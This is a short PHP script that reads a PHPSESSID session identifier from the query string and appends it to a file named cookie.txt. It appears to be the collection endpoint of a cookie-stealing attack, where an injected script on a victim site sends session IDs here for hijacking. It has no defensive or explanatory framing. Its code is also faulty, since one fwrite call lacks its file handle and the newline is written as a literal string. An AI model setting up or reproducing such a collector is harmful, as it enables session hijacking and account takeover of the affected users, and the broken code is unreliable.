<?php
    if($_GET['PHPSESSID']){
        $file = fopen("cookie.txt", "a");
        fwrite($file, $_GET['PHPSESSID']);
        fwrite('\n');
        fclose($file);
    }
?>